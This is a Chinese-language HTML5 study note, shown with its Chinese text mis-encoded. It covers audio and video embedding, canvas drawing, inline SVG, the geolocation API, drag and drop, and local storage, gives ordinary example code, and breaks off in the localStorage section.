å¤šåª’ä½“Web ä¸Šçš„å¤šåª’ä½“æŒ‡çš„æ˜¯éŸ³æ•ˆã€éŸ³ä¹ã€è§†é¢‘å’ŒåŠ¨ç”»ç­‰ã€‚ object å…ƒç´ &lt;object&gt; çš„ä½œç”¨æ˜¯æ”¯æŒ HTML åŠ©æ‰‹ï¼ˆæ’ä»¶ï¼‰ã€‚ è¾…åŠ©åº”ç”¨ç¨‹åºï¼ˆhelper applicationï¼‰æ˜¯å¯ç”±æµè§ˆå™¨å¯åŠ¨çš„ç¨‹åºï¼Œä¹Ÿç§°ä¸ºæ’ä»¶ã€‚ è¾…åŠ©ç¨‹åºå¯ç”¨äºæ’­æ”¾éŸ³é¢‘å’Œè§†é¢‘ï¼ˆä»¥åŠå…¶ä»–ï¼‰ã€‚è¾…åŠ©ç¨‹åºæ˜¯ä½¿ç”¨ &lt;object&gt; æ ‡ç­¾æ¥åŠ è½½çš„ã€‚ éŸ³é¢‘æœ‰è¿™å‡ ç§æ–¹æ¡ˆï¼š å¯ä»¥ä½¿ç”¨æ’ä»¶ã€ä½¿ç”¨&lt;embed&gt;å…ƒç´ ã€ä½¿ç”¨ &lt;object&gt; å…ƒç´ ã€ä½¿ç”¨ HTML5 &lt;audio&gt; å…ƒç´ ç­‰ã€‚ ä½¿ç”¨&lt;embed&gt;å…ƒç´ &lt;embed height=\"100\" width=\"100\" src=\"song.mp3\" /&gt; ä½¿ç”¨ &lt;object&gt; å…ƒç´ &lt;object height=\"100\" width=\"100\" data=\"song.mp3\"&gt;&lt;/object&gt; ä½¿ç”¨ HTML5 &lt;audio&gt; å…ƒç´ &lt;audio controls=\"controls\"&gt; &lt;source src=\"song.mp3\" type=\"audio/mp3\" /&gt; &lt;source src=\"song.ogg\" type=\"audio/ogg\" /&gt; Your browser does not support this audio format. &lt;/audio&gt; è¿™é‡Œå®šä¹‰äº†ä¸€ä¸ªå¤‡é€‰æ–‡ä»¶æºï¼Œå½“.mp3 å¤±æ•ˆæˆ–æµè§ˆå™¨ä¸æ”¯æŒæ—¶ï¼Œå¯ä»¥è°ƒç”¨ .ogg çš„æ–‡ä»¶ã€‚æµè§ˆå™¨å°†ä½¿ç”¨ç¬¬ä¸€ä¸ªå¯è¯†åˆ«çš„æ ¼å¼ã€‚ è‹¥æµè§ˆå™¨ä¸æ”¯æŒaudioå…ƒç´ çš„è¯ï¼Œåˆ™ä¼šæ˜¾ç¤º Your browser does not support this audio format. audioå…ƒç´ æœ‰å¦‚ä¸‹çš„å±æ€§ï¼š å±æ€§ å€¼ æè¿° autoplay autoplay å¦‚æœå‡ºç°è¯¥å±æ€§ï¼Œåˆ™éŸ³é¢‘åœ¨å°±ç»ªåé©¬ä¸Šæ’­æ”¾ã€‚ controls controls å¦‚æœå‡ºç°è¯¥å±æ€§ï¼Œåˆ™å‘ç”¨æˆ·æ˜¾ç¤ºæ§ä»¶ï¼Œæ¯”å¦‚æ’­æ”¾æŒ‰é’®ã€‚ loop loop å¦‚æœå‡ºç°è¯¥å±æ€§ï¼Œåˆ™æ¯å½“éŸ³é¢‘ç»“æŸæ—¶é‡æ–°å¼€å§‹æ’­æ”¾ã€‚ preload preload å¦‚æœå‡ºç°è¯¥å±æ€§ï¼Œåˆ™éŸ³é¢‘åœ¨é¡µé¢åŠ è½½æ—¶è¿›è¡ŒåŠ è½½ï¼Œå¹¶é¢„å¤‡æ’­æ”¾ã€‚å¦‚æœä½¿ç”¨ â€œautoplayâ€ï¼Œåˆ™å¿½ç•¥è¯¥å±æ€§ã€‚ src url è¦æ’­æ”¾çš„éŸ³é¢‘çš„ URLã€‚ æ›´å¥½çš„æ–¹æ¡ˆ&lt;audio&gt; å…ƒç´ ä¼šå°è¯•ä»¥ mp3 æˆ– ogg æ¥æ’­æ”¾éŸ³é¢‘ã€‚å¦‚æœå¤±è´¥ï¼Œä»£ç å°†å›é€€å°è¯• &lt;embed&gt; å…ƒç´ ã€‚ &lt;audio controls=\"controls\" height=\"100\" width=\"100\"&gt; &lt;source src=\"song.mp3\" type=\"audio/mp3\" /&gt; &lt;source src=\"song.ogg\" type=\"audio/ogg\" /&gt; &lt;embed height=\"100\" width=\"100\" src=\"song.mp3\" /&gt; &lt;/audio&gt; ä½¿ç”¨è¶…é“¾æ¥å®åœ¨ä¸è¡Œï¼Œå°±ç›´æ¥ç”¨ a é“¾æ¥æ ‡ç­¾å§ã€‚ ç‚¹å‡»è¯¥é“¾æ¥ï¼Œæµè§ˆå™¨ä¼šå¯åŠ¨â€œè¾…åŠ©åº”ç”¨ç¨‹åºâ€æ¥æ’­æ”¾è¯¥æ–‡ä»¶ã€‚ä¹Ÿå¯èƒ½ä¼šå¼¹å‡ºæ–‡ä»¶ä¸‹è½½ç•Œé¢ã€‚ &lt;a href=\"song.mp3\"&gt;Play the sound&lt;/a&gt; è§†é¢‘å’ŒéŸ³é¢‘ç±»ä¼¼ï¼Œä¹Ÿå¯ä»¥ç”¨&lt;embed&gt;å…ƒç´ ã€&lt;object&gt; å…ƒç´ ã€HTML5 &lt;video&gt; å…ƒç´ ã€è¶…é“¾æ¥ç­‰ã€‚ åªæ˜¯æŠŠç›¸åº”çš„æºï¼ˆsrcã€dataã€hrefç­‰ï¼‰ä¿®æ”¹ä¸ºè§†é¢‘åœ°å€å³å¯ã€‚ ä½¿ç”¨ &lt;video&gt; æ ‡ç­¾æ˜¾ç¤ºä¸€æ®µåµŒå…¥ç½‘é¡µçš„ oggã€mp4 æˆ– webm æ ¼å¼çš„è§†é¢‘ã€‚ å®ƒæœ‰ä»¥ä¸‹å±æ€§ï¼š å±æ€§ å€¼ æè¿° autoplay autoplay å¦‚æœå‡ºç°è¯¥å±æ€§ï¼Œåˆ™è§†é¢‘åœ¨å°±ç»ªåé©¬ä¸Šæ’­æ”¾ã€‚ controls controls å¦‚æœå‡ºç°è¯¥å±æ€§ï¼Œåˆ™å‘ç”¨æˆ·æ˜¾ç¤ºæ§ä»¶ï¼Œæ¯”å¦‚æ’­æ”¾æŒ‰é’®ã€‚ height pixels è®¾ç½®è§†é¢‘æ’­æ”¾å™¨çš„é«˜åº¦ã€‚ loop loop å¦‚æœå‡ºç°è¯¥å±æ€§ï¼Œåˆ™å½“åª’ä»‹æ–‡ä»¶å®Œæˆæ’­æ”¾åå†æ¬¡å¼€å§‹æ’­æ”¾ã€‚ preload preload å¦‚æœå‡ºç°è¯¥å±æ€§ï¼Œåˆ™è§†é¢‘åœ¨é¡µé¢åŠ è½½æ—¶è¿›è¡ŒåŠ è½½ï¼Œå¹¶é¢„å¤‡æ’­æ”¾ã€‚å¦‚æœä½¿ç”¨ â€œautoplayâ€ï¼Œåˆ™å¿½ç•¥è¯¥å±æ€§ã€‚ src url è¦æ’­æ”¾çš„è§†é¢‘çš„ URLã€‚ width pixels è®¾ç½®è§†é¢‘æ’­æ”¾å™¨çš„å®½åº¦ã€‚ &lt;video width=\"320\" height=\"240\" controls=\"controls\"&gt; &lt;source src=\"movie.mp4\" type=\"video/mp4\" /&gt; &lt;source src=\"movie.ogg\" type=\"video/ogg\" /&gt; &lt;source src=\"movie.webm\" type=\"video/webm\" /&gt; Your browser does not support the video tag. &lt;/video&gt; å¯ä»¥ä½¿ç”¨ DOM è¿›è¡Œæ§åˆ¶è§†é¢‘çš„æ’­æ”¾ã€æš‚åœä»¥åŠåŠ è½½ç­‰ã€‚ &lt;script type=\"text/javascript\"&gt; var myVideo=document.getElementById(\"video1\"); function playPause() { if (myVideo.paused) myVideo.play(); else myVideo.pause(); } function makeBig() { myVideo.width=560; } function makeSmall() { myVideo.width=320; } function makeNormal() { myVideo.width=420; } &lt;/script&gt; æ›´å¥½çš„æ–¹æ¡ˆ&lt;video width=\"320\" height=\"240\" controls=\"controls\"&gt; &lt;source src=\"movie.mp4\" type=\"video/mp4\" /&gt; &lt;source src=\"movie.ogg\" type=\"video/ogg\" /&gt; &lt;source src=\"movie.webm\" type=\"video/webm\" /&gt; &lt;object data=\"movie.mp4\" width=\"320\" height=\"240\"&gt; &lt;embed src=\"movie.swf\" width=\"320\" height=\"240\" /&gt; &lt;/object&gt; &lt;/video&gt; ä½¿ç”¨äº† 4 ç§ä¸åŒçš„è§†é¢‘æ ¼å¼ã€‚HTML 5 &lt;video&gt; å…ƒç´ ä¼šå°è¯•æ’­æ”¾ä»¥ mp4ã€ogg æˆ– webm æ ¼å¼ä¸­çš„ä¸€ç§æ¥æ’­æ”¾è§†é¢‘ã€‚å¦‚æœå‡å¤±è´¥ï¼Œåˆ™å›é€€åˆ° &lt;embed&gt; å…ƒç´ ã€‚ å½“ç„¶ï¼Œå¦‚æœè¿˜ä¸è¡Œï¼Œå¯ä»¥æŠŠè§†é¢‘ä¸Šä¼ åˆ°å„å¤§è§†é¢‘ç½‘ç«™ï¼Œç„¶ååµŒå…¥è§†é¢‘å°±å®Œäº‹äº†ã€‚ CanvasHTML5 çš„ canvas å…ƒç´ ä½¿ç”¨ JavaScript åœ¨ç½‘é¡µä¸Šç»˜åˆ¶å›¾åƒã€‚ ç”»å¸ƒæ˜¯ä¸€ä¸ªçŸ©å½¢åŒºåŸŸï¼Œæ‚¨å¯ä»¥æ§åˆ¶å…¶æ¯ä¸€åƒç´ ã€‚ canvas æ‹¥æœ‰å¤šç§ç»˜åˆ¶è·¯å¾„ã€çŸ©å½¢ã€åœ†å½¢ã€å­—ç¬¦ä»¥åŠæ·»åŠ å›¾åƒçš„æ–¹æ³•ã€‚ åˆ›å»º canvas&lt;canvas id=\"myCanvasTest\" width=\"200\" height=\"100\"&gt;&lt;/canvas&gt; canvas å…ƒç´ æœ¬èº«æ˜¯æ²¡æœ‰ç»˜å›¾èƒ½åŠ›çš„ã€‚æ‰€æœ‰çš„ç»˜åˆ¶å·¥ä½œå¿…é¡»åœ¨ JavaScript å†…éƒ¨å®Œæˆã€‚ æ¯”å¦‚ç»˜åˆ¶ä¸€ä¸ªçº¢è‰²çš„çŸ©å½¢ã€‚ å…¶ä¸­ï¼ŒgetContext(\"2d\") å¯¹è±¡æ˜¯å†…å»ºçš„ HTML5 å¯¹è±¡ï¼Œæ‹¥æœ‰å¤šç§ç»˜åˆ¶è·¯å¾„ã€çŸ©å½¢ã€åœ†å½¢ã€å­—ç¬¦ä»¥åŠæ·»åŠ å›¾åƒçš„æ–¹æ³•ã€‚ &lt;script type=\"text/javascript\"&gt; var c=document.getElementById(\"myCanvasTest\"); var cxt=c.getContext(\"2d\"); cxt.fillStyle=\"#FF0000\"; cxt.fillRect(0,0,150,75); &lt;/script&gt; var c=document.getElementById(\"myCanvasTest\"); var cxt=c.getContext(\"2d\"); cxt.fillStyle=\"#FF0000\"; cxt.fillRect(0,0,150,75); åæ ‡å·¦ä¸Šè§’ä¸º (0,0)ï¼Œå·¦åˆ°å³ä¸ºxè½´æ­£æ–¹å‘ï¼Œä¸Šåˆ°ä¸‹ä¸ºyè½´æ­£æ–¹å‘ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºã€‚ è¿™é‡Œæœ‰ä¸ªç¤ºä¾‹â†“ã€‚ function cnvs_getCoordinates(e) { x=e.clientX; y=e.clientY; document.getElementById(\"xycoordinates\").innerHTML=\"Coordinates: (\" + x + \",\" + y + \")\"; } function cnvs_clearCoordinates() { document.getElementById(\"xycoordinates\").innerHTML=\"\"; } æŠŠé¼ æ ‡æ‚¬åœåœ¨ä¸‹é¢çš„çŸ©å½¢ä¸Šå¯ä»¥çœ‹åˆ°åæ ‡ï¼š ç»˜åˆ¶çº¿æ¡&lt;canvas id=\"myCanvas1\" width=\"200\" height=\"100\" style=\"border:1px solid #c3c3c3;\"&gt; Your browser does not support the canvas element. &lt;/canvas&gt; &lt;script type=\"text/javascript\"&gt; var c=document.getElementById(\"myCanvas1\"); var cxt=c.getContext(\"2d\"); cxt.moveTo(10,10); cxt.lineTo(150,50); cxt.lineTo(10,50); cxt.stroke(); &lt;/script&gt; Your browser does not support the canvas element. var c=document.getElementById(\"myCanvas\"); var cxt=c.getContext(\"2d\"); cxt.moveTo(10,10); cxt.lineTo(150,50); cxt.lineTo(10,50); cxt.stroke(); ç»˜åˆ¶åœ†å½¢&lt;canvas id=\"myCanvas2\" width=\"200\" height=\"100\" style=\"border:1px solid #c3c3c3;\"&gt; Your browser does not support the canvas element. &lt;/canvas&gt; &lt;script type=\"text/javascript\"&gt; var c=document.getElementById(\"myCanvas2\"); var cxt=c.getContext(\"2d\"); cxt.fillStyle=\"#FF0000\"; cxt.beginPath(); cxt.arc(70,18,15,0,Math.PI*2,true); cxt.closePath(); cxt.fill(); &lt;/script&gt; Your browser does not support the canvas element. var c=document.getElementById(\"myCanvas2\"); var cxt=c.getContext(\"2d\"); cxt.fillStyle=\"#FF0000\"; cxt.beginPath(); cxt.arc(70,18,15,0,Math.PI*2,true); cxt.closePath(); cxt.fill(); ç»˜åˆ¶æ¸å˜èƒŒæ™¯&lt;canvas id=\"myCanvas3\" width=\"200\" height=\"100\" style=\"border:1px solid #c3c3c3;\"&gt; Your browser does not support the canvas element. &lt;/canvas&gt; &lt;script type=\"text/javascript\"&gt; var c=document.getElementById(\"myCanvas3\"); var cxt=c.getContext(\"2d\"); var grd=cxt.createLinearGradient(0,0,175,50); grd.addColorStop(0,\"#FF0000\"); grd.addColorStop(1,\"#00FF00\"); cxt.fillStyle=grd; cxt.fillRect(0,0,175,50); &lt;/script&gt; Your browser does not support the canvas element. var c=document.getElementById(\"myCanvas3\"); var cxt=c.getContext(\"2d\"); var grd=cxt.createLinearGradient(0,0,175,50); grd.addColorStop(0,\"#FF0000\"); grd.addColorStop(1,\"#00FF00\"); cxt.fillStyle=grd; cxt.fillRect(0,0,175,50); æ”¾ç½®å›¾åƒ&lt;canvas id=\"myCanvas4\" width=\"200\" height=\"200\" style=\"border:1px solid #c3c3c3;\"&gt; Your browser does not support the canvas element. &lt;/canvas&gt; &lt;script type=\"text/javascript\"&gt; var c=document.getElementById(\"myCanvas4\"); var cxt=c.getContext(\"2d\"); var img=new Image() img.src=\"FrontEnd_HTML_Advanced/start_again.jpg\" cxt.drawImage(img,0,0); &lt;/script&gt; Your browser does not support the canvas element. var c=document.getElementById(\"myCanvas4\"); var cxt=c.getContext(\"2d\"); var img=new Image() img.src=\"FrontEnd_HTML_Advanced/start_again.jpg\" cxt.drawImage(img,0,0); å†…è” SVGSVG æŒ‡å¯ä¼¸ç¼©çŸ¢é‡å›¾å½¢ (Scalable Vector Graphics)ï¼Œç”¨äºå®šä¹‰ç”¨äºç½‘ç»œçš„åŸºäºçŸ¢é‡çš„å›¾å½¢ã€‚SVG ä½¿ç”¨ XML æ ¼å¼å®šä¹‰å›¾å½¢ã€‚SVG å›¾åƒåœ¨æ”¾å¤§æˆ–æ”¹å˜å°ºå¯¸çš„æƒ…å†µä¸‹å…¶å›¾å½¢è´¨é‡ä¸ä¼šæœ‰æŸå¤±ã€‚SVG æ˜¯ä¸‡ç»´ç½‘è”ç›Ÿçš„æ ‡å‡†ã€‚ &lt;svg xmlns=\"http://www.w3.org/2000/svg\" version=\"1.1\" height=\"190\"&gt; &lt;polygon points=\"100,10 40,180 190,60 10,60 160,180\" style=\"fill:lime;stroke:purple;stroke-width:5;fill-rule:evenodd;\" /&gt; &lt;/svg&gt; SVG æœ¬èº«å°±æŒºå¤æ‚çš„ï¼Œä¹Ÿå¾ˆå¼ºå¤§ï¼Œæœ‰ä¸“é—¨çš„æ•™ç¨‹æ¥å­¦è¿™ä¸ªã€‚ ä¸è¿‡ç›®å‰æ¥è¯´æˆ‘è¿˜ç”¨ä¸åˆ°å‘¢ï¼Œåé¢æ„Ÿå…´è¶£å†æ…¢æ…¢çœ‹å§ã€‚ Canvas VS SVGCanvasCanvas é€šè¿‡ JavaScript æ¥ç»˜åˆ¶ 2D å›¾å½¢ã€‚ Canvas é€åƒç´ è¿›è¡Œæ¸²æŸ“ã€‚ åœ¨ canvas ä¸­ï¼Œä¸€æ—¦å›¾å½¢è¢«ç»˜åˆ¶å®Œæˆï¼Œå®ƒå°±ä¸ä¼šç»§ç»­å¾—åˆ°æµè§ˆå™¨çš„å…³æ³¨ã€‚ å¦‚æœå…¶ä½ç½®å‘ç”Ÿå˜åŒ–ï¼Œé‚£ä¹ˆæ•´ä¸ªåœºæ™¯ä¹Ÿéœ€è¦é‡æ–°ç»˜åˆ¶ï¼ŒåŒ…æ‹¬ä»»ä½•æˆ–è®¸å·²è¢«å›¾å½¢è¦†ç›–çš„å¯¹è±¡ã€‚ ä¾èµ–åˆ†è¾¨ç‡ ä¸æ”¯æŒäº‹ä»¶å¤„ç†å™¨ å¼±çš„æ–‡æœ¬æ¸²æŸ“èƒ½åŠ› èƒ½å¤Ÿä»¥ .png æˆ– .jpg æ ¼å¼ä¿å­˜ç»“æœå›¾åƒ æœ€é€‚åˆå›¾åƒå¯†é›†å‹çš„æ¸¸æˆï¼Œå…¶ä¸­çš„è®¸å¤šå¯¹è±¡ä¼šè¢«é¢‘ç¹é‡ç»˜ SVGSVG æ˜¯ä¸€ç§ä½¿ç”¨ XML æè¿° 2D å›¾å½¢çš„è¯­è¨€ã€‚ SVG åŸºäº XMLï¼Œè¿™æ„å‘³ç€ SVG DOM ä¸­çš„æ¯ä¸ªå…ƒç´ éƒ½æ˜¯å¯ç”¨çš„ã€‚å¯ä»¥ä¸ºæŸä¸ªå…ƒç´ é™„åŠ  JavaScript äº‹ä»¶å¤„ç†å™¨ã€‚ åœ¨ SVG ä¸­ï¼Œæ¯ä¸ªè¢«ç»˜åˆ¶çš„å›¾å½¢å‡è¢«è§†ä¸ºå¯¹è±¡ã€‚å¦‚æœ SVG å¯¹è±¡çš„å±æ€§å‘ç”Ÿå˜åŒ–ï¼Œé‚£ä¹ˆæµè§ˆå™¨èƒ½å¤Ÿè‡ªåŠ¨é‡ç°å›¾å½¢ã€‚ ä¸ä¾èµ–åˆ†è¾¨ç‡ æ”¯æŒäº‹ä»¶å¤„ç†å™¨ æœ€é€‚åˆå¸¦æœ‰å¤§å‹æ¸²æŸ“åŒºåŸŸçš„åº”ç”¨ç¨‹åºï¼ˆæ¯”å¦‚è°·æ­Œåœ°å›¾ï¼‰ å¤æ‚åº¦é«˜ä¼šå‡æ…¢æ¸²æŸ“é€Ÿåº¦ï¼ˆä»»ä½•è¿‡åº¦ä½¿ç”¨ DOM çš„åº”ç”¨éƒ½ä¸å¿«ï¼‰ ä¸é€‚åˆæ¸¸æˆåº”ç”¨ åœ°ç†å®šä½HTML5 æä¾›äº†ä¸€ä¸ªè·å–ç”¨æˆ·ä½ç½®ä¿¡æ¯çš„APIã€‚ å½“ç„¶è¿™ä¸ªéœ€è¦ç”¨æˆ·çš„è®¸å¯æ‰è¡Œã€‚ getCurrentPosition() æ–¹æ³•å¯ä»¥ç”¨æ¥è·å¾—ç”¨æˆ·çš„ä½ç½®ã€‚å¦‚æœèƒ½æ­£å¸¸è°ƒç”¨çš„è¯ï¼Œä¼šè¿”å›å¦‚ä¸‹ä¿¡æ¯ã€‚ å±æ€§ æè¿° coords.latitude åè¿›åˆ¶æ•°çš„çº¬åº¦ coords.longitude åè¿›åˆ¶æ•°çš„ç»åº¦ coords.accuracy ä½ç½®ç²¾åº¦ coords.altitude æµ·æ‹”ï¼Œæµ·å¹³é¢ä»¥ä¸Šä»¥ç±³è®¡ coords.altitudeAccuracy ä½ç½®çš„æµ·æ‹”ç²¾åº¦ coords.heading æ–¹å‘ï¼Œä»æ­£åŒ—å¼€å§‹ä»¥åº¦è®¡ coords.speed é€Ÿåº¦ï¼Œä»¥ç±³/æ¯ç§’è®¡ timestamp å“åº”çš„æ—¥æœŸ/æ—¶é—´ å¦‚æœgetCurrentPosition()è¿è¡ŒæˆåŠŸï¼Œåˆ™å‘å‚æ•°showPositionä¸­è§„å®šçš„å‡½æ•°è¿”å›ä¸€ä¸ªcoordinateså¯¹è±¡ã€‚ showPosition() å‡½æ•°è·å¾—å¹¶æ˜¾ç¤ºç»åº¦å’Œçº¬åº¦ã€‚ getCurrentPosition() æ–¹æ³•çš„ç¬¬äºŒä¸ªå‚æ•°ç”¨äºå¤„ç†é”™è¯¯ã€‚å®ƒè§„å®šå½“è·å–ç”¨æˆ·ä½ç½®å¤±è´¥æ—¶è¿è¡Œçš„å‡½æ•°ã€‚ï¼ˆç±»ä¼¼äºå›è°ƒå‡½æ•°ï¼Ÿï¼‰ showError() å‡½æ•°ç”¨äºå¤„ç†é”™è¯¯ã€‚ &lt;p id=\"geolocation_demo\"&gt;ç‚¹å‡»è¿™ä¸ªæŒ‰é’®ï¼Œå°†æ˜¾ç¤ºæ‚¨çš„åæ ‡ï¼š&lt;/p&gt; &lt;button onclick=\"getLocation()\"&gt;è¯•ä¸€ä¸‹&lt;/button&gt; &lt;script&gt; var x=document.getElementById(\"geolocation_demo\"); function getLocation() { if (navigator.geolocation) { navigator.geolocation.getCurrentPosition(showPosition, showError); } else{x.innerHTML=\"Geolocation is not supported by this browser.\";} } function showPosition(position) { x.innerHTML=\"Latitude: \" + position.coords.latitude + \"&lt;br /&gt;Longitude: \" + position.coords.longitude; } function showError(error) { switch(error.code) { case error.PERMISSION_DENIED: x.innerHTML=\"User denied the request for Geolocation.\" break; case error.POSITION_UNAVAILABLE: x.innerHTML=\"Location information is unavailable.\" break; case error.TIMEOUT: x.innerHTML=\"The request to get user location timed out.\" break; case error.UNKNOWN_ERROR: x.innerHTML=\"An unknown error occurred.\" break; } } &lt;/script&gt; ç‚¹å‡»è¿™ä¸ªæŒ‰é’®ï¼Œå°†æ˜¾ç¤ºæ‚¨çš„åæ ‡ï¼š è¯•ä¸€ä¸‹ var x=document.getElementById(\"geolocation_demo\"); function getLocation() { if (navigator.geolocation) { navigator.geolocation.getCurrentPosition(showPosition, showError); } else{x.innerHTML=\"Geolocation is not supported by this browser.\";} } function showPosition(position) { x.innerHTML=\"Latitude: \" + position.coords.latitude + \"Longitude: \" + position.coords.longitude; } function showError(error) { switch(error.code) { case error.PERMISSION_DENIED: x.innerHTML=\"User denied the request for Geolocation.\" break; case error.POSITION_UNAVAILABLE: x.innerHTML=\"Location information is unavailable.\" break; case error.TIMEOUT: x.innerHTML=\"The request to get user location timed out.\" break; case error.UNKNOWN_ERROR: x.innerHTML=\"An unknown error occurred.\" break; } } å¦‚éœ€åœ¨åœ°å›¾ä¸­æ˜¾ç¤ºç»“æœï¼Œå¯ä»¥è°ƒç”¨è°·æ­Œåœ°å›¾ã€ç™¾åº¦åœ°å›¾ç­‰åœ°å›¾çš„APIã€‚ è¿˜æœ‰ä¸€äº›å…¶ä»–çš„æ–¹æ³•ï¼š watchPosition() è¿”å›ç”¨æˆ·çš„å½“å‰ä½ç½®ï¼Œå¹¶ç»§ç»­è¿”å›ç”¨æˆ·ç§»åŠ¨æ—¶çš„æ›´æ–°ä½ç½®ï¼ˆç±»ä¼¼äº GPSï¼‰ã€‚ clearWatch() åœæ­¢ watchPosition() æ–¹æ³•ã€‚ æ‹–æ”¾æ‹–æ”¾ï¼ˆDrag å’Œ Dropï¼‰æŒ‡çš„æ˜¯æŠ“å–æŸç‰©å¹¶æ‹–å…¥ä¸åŒçš„ä½ç½®ã€‚ HTML5 ä¸­ä»»ä½•å…ƒç´ éƒ½æ˜¯å¯æ‹–æ”¾çš„ã€‚ ï¼ˆè¿™é‡Œæˆ‘è¿˜ä¸æ˜¯å¾ˆæ˜ç™½ï¼Œåé¢å…·ä½“çœ‹çœ‹ JavaScript çš„æ—¶å€™å†å›æ¥çœ‹ä¸€çœ‹ &lt;style type=\"text/css\"&gt; #divmiao1 {width:200px; height:200px;padding:10px;border:1px solid #aaaaaa;} &lt;/style&gt; &lt;script type=\"text/javascript\"&gt; function allowDrop(ev) { ev.preventDefault(); } function drag(ev) { ev.dataTransfer.setData(\"Text\",ev.target.id); } function drop(ev) { ev.preventDefault(); var data=ev.dataTransfer.getData(\"Text\"); ev.target.appendChild(document.getElementById(data)); } &lt;/script&gt; &lt;p&gt;è¯·æŠŠå›¾ç‰‡æ‹–æ”¾åˆ°çŸ©å½¢ä¸­ï¼š&lt;/p&gt; &lt;div id=\"divmiao1\" ondrop=\"drop(event)\" ondragover=\"allowDrop(event)\"&gt;&lt;/div&gt; &lt;br /&gt; &lt;img id=\"drag1\" src=\"FrontEnd_HTML_Advanced/start_again.jpg\" draggable=\"true\" ondragstart=\"drag(event)\" /&gt; #divmiao1 {width:200px; height:200px;padding:10px;border:1px solid #aaaaaa;} function allowDrop(ev) { ev.preventDefault(); } function drag(ev) { ev.dataTransfer.setData(\"Text\",ev.target.id); } function drop(ev) { ev.preventDefault(); var data=ev.dataTransfer.getData(\"Text\"); ev.target.appendChild(document.getElementById(data)); } è¯·æŠŠå›¾ç‰‡æ‹–æ”¾åˆ°çŸ©å½¢ä¸­ï¼š draggableé¦–å…ˆéœ€è¦æŠŠæƒ³è¦æ‹–åŠ¨çš„å…ƒç´ æ–°å¢ä¸€ä¸ª draggable å±æ€§ï¼Œå³ &lt;img draggable=\"true\"&gt;ã€‚ ç„¶åï¼Œè§„å®šå½“å…ƒç´ è¢«æ‹–åŠ¨æ—¶å‘ç”Ÿçš„äº‹æƒ…ã€‚ ondragstartondragstart å±æ€§è°ƒç”¨äº†ä¸€ä¸ª drag(event) å‡½æ•°ï¼Œè§„å®šæ‹–åŠ¨ä»€ä¹ˆæ•°æ®ã€‚ dataTransfer.setData() æ–¹æ³•è®¾ç½®è¢«æ‹–åŠ¨æ•°æ®çš„æ•°æ®ç±»å‹å’Œå€¼ã€‚è¿™é‡Œçš„æ•°æ®ç±»å‹æ˜¯ â€œtextâ€ï¼Œè€Œå€¼æ˜¯è¿™ä¸ªå¯æ‹–åŠ¨å…ƒç´ çš„ id (â€œdrag1â€)ã€‚ ondragoverondragover äº‹ä»¶è§„å®šè¢«æ‹–åŠ¨çš„æ•°æ®èƒ½å¤Ÿè¢«æ”¾ç½®åˆ°ä½•å¤„ã€‚ é»˜è®¤åœ°ï¼Œæ•°æ®/å…ƒç´ æ— æ³•è¢«æ”¾ç½®åˆ°å…¶ä»–å…ƒç´ ä¸­ã€‚ä¸ºäº†å®ç°æ‹–æ”¾ï¼Œæˆ‘ä»¬å¿…é¡»é˜»æ­¢å…ƒç´ çš„è¿™ç§é»˜è®¤çš„å¤„ç†æ–¹å¼ã€‚ è¿™ä¸ªä»»åŠ¡ç”± ondragover äº‹ä»¶çš„ event.preventDefault() æ–¹æ³•å®Œæˆã€‚ ondropå½“æ”¾å¼€è¢«æ‹–æ•°æ®æ—¶ï¼Œä¼šå‘ç”Ÿ drop äº‹ä»¶ã€‚ åœ¨ä¸Šé¢çš„ä¾‹å­ä¸­ï¼Œondrop å±æ€§è°ƒç”¨äº†ä¸€ä¸ªå‡½æ•°ï¼Œdrop(event)ã€‚ function drop(ev) { ev.preventDefault(); var data = ev.dataTransfer.getData(\"text\"); ev.target.appendChild(document.getElementById(data)); } è°ƒç”¨ preventDefault() æ¥é˜»æ­¢æ•°æ®çš„æµè§ˆå™¨é»˜è®¤å¤„ç†æ–¹å¼ï¼ˆdrop äº‹ä»¶çš„é»˜è®¤è¡Œä¸ºæ˜¯ä»¥é“¾æ¥å½¢å¼æ‰“å¼€ï¼‰ é€šè¿‡ dataTransfer.getData() æ–¹æ³•è·å¾—è¢«æ‹–çš„æ•°æ®ã€‚è¯¥æ–¹æ³•å°†è¿”å›åœ¨ setData() æ–¹æ³•ä¸­è®¾ç½®ä¸ºç›¸åŒç±»å‹çš„ä»»ä½•æ•°æ® è¢«æ‹–æ•°æ®æ˜¯è¢«æ‹–å…ƒç´ çš„ id (â€œdrag1â€) æŠŠè¢«æ‹–å…ƒç´ è¿½åŠ åˆ°æ”¾ç½®å…ƒç´ ä¸­ æœ¬åœ°å­˜å‚¨é€šè¿‡æœ¬åœ°å­˜å‚¨ï¼ˆLocal Storageï¼‰ï¼Œweb åº”ç”¨ç¨‹åºèƒ½å¤Ÿåœ¨ç”¨æˆ·æµè§ˆå™¨ä¸­å¯¹æ•°æ®è¿›è¡Œæœ¬åœ°çš„å­˜å‚¨ã€‚ åœ¨ HTML5 ä¹‹å‰ï¼Œåº”ç”¨ç¨‹åºæ•°æ®åªèƒ½å­˜å‚¨åœ¨ cookie ä¸­ï¼ŒåŒ…æ‹¬æ¯ä¸ªæœåŠ¡å™¨è¯·æ±‚ã€‚ æœ¬åœ°å­˜å‚¨åˆ™æ›´å®‰å…¨ï¼Œå¹¶ä¸”å¯åœ¨ä¸å½±å“ç½‘ç«™æ€§èƒ½çš„å‰æä¸‹å°†å¤§é‡æ•°æ®å­˜å‚¨äºæœ¬åœ°ã€‚ ä¸ cookie ä¸åŒï¼Œå­˜å‚¨é™åˆ¶è¦å¤§å¾—å¤šï¼ˆè‡³å°‘5MBï¼‰ï¼Œå¹¶ä¸”ä¿¡æ¯ä¸ä¼šè¢«ä¼ è¾“åˆ°æœåŠ¡å™¨ã€‚ HTML æœ¬åœ°å­˜å‚¨æä¾›äº†ä¸¤ä¸ªåœ¨å®¢æˆ·ç«¯å­˜å‚¨æ•°æ®çš„å¯¹è±¡ï¼š window.localStorage - å­˜å‚¨æ²¡æœ‰æˆªæ­¢æ—¥æœŸçš„æ•°æ®ï¼Œå½“æµè§ˆå™¨è¢«å…³é—­æ—¶æ•°æ®ä¸ä¼šè¢«åˆ é™¤ window.sessionStorage - é’ˆå¯¹ä¸€ä¸ª session æ¥å­˜å‚¨æ•°æ®ï¼Œå½“å…³é—­æµè§ˆå™¨æ ‡ç­¾é¡µæ—¶æ•°æ®ä¼šä¸¢å¤± localStorage å¯¹è±¡&lt;div id=\"test_result\"&gt;&lt;/div&gt; &lt;script&gt; // Check browser support if (typeof(Storage) !== \"undefined\") { // å­˜å‚¨ Store 